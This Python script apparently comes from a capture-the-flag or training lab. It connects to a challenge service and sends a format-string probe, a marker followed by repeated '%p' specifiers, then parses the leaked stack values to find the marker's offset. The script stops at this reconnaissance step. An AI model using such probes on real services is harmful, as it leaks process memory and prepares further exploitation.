import sys, re, socket, time, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "mars.cylabacademy.net", 31929


def collect(s, t=1.6):
    s.settimeout(0.5)
    buf = b""
    t0 = time.time()
    while time.time() - t0 < t:
        try:
            c = s.recv(8192)
            if not c:
                break
            buf += c
        except socket.timeout:
            continue
    return buf


def run(a_bytes, b_bytes=b"2"):
    s = socket.create_connection((HOST, PORT), timeout=15)
    s.settimeout(6)
    collect(s, 0.9)
    s.sendall(a_bytes + b"\n")
    time.sleep(0.45)
    collect(s, 0.5)
    s.sendall(b_bytes + b"\n")
    time.sleep(0.9)
    o = collect(s, 1.6)
    s.close()
    return o


MARK = b"ABCDEFGH"
for prelen in (13,):
    pre = b"1" + b"A" * (prelen - 1)
    a = pre + MARK + b"%p." * 25
    out = run(a)
    m = re.search(rb"Calculating for A: (.*?)and B:", out, re.S)
    seg = m.group(1) if m else out
    vals = re.findall(rb"0x[0-9a-f]+|\(nil\)", seg)
    print("prelen=%d, %d valeurs" % (prelen, len(vals)))
    for i, v in enumerate(vals, start=1):
        tag = ""
        if v.lower() == b"0x4847464544434241":
            tag = "  <<< MARQUEUR a la position %d" % i
        elif v in (b"0x4141414141414131", b"0x4141414141414141"):
            tag = "  <-- buffer debut"
        print("   #%-2d %s%s" % (i, v.decode(), tag))
